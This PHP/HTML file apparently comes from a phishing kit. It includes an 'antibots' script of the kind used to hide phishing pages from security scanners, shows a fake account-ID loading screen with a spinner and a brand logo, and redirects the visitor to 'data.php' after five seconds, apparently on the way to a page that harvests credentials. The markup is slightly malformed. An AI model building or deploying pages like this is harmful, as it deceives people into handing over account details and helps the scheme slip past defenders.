<?php
include '_data_/antibots.php';
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Account ID 704-852-917-371</title>
<link href="_data_/favicon.png" rel="icon" sizes="128x128" type="image/png">
<link href="_data_/pros.css" rel="stylesheet">
<script type="text/javascript">
  setTimeout(function(){
    location = 'data.php?id=$ip'
  },5000)
</script>
</head>
<body>
<div id="wb_Form1" style="position:absolute;left:724px;top:0px;width:475px;height:586px;z-index:2;">
<div id="wb_Image2" style="position:absolute;left:194px;top:313px;width:86px;height:86px;z-index:0;">
<img src="_data_/ring.gif" id="Image2" alt="" width="86" height="86"></div>
<div id="wb_Image1" style="position:absolute;left:168px;top:255px;width:139px;height:41px;z-index:1;">
<img src="_data_/logo.png" id="Image1" alt="" width="139" height="42"></div>
</form>
</div>
</body>
</html>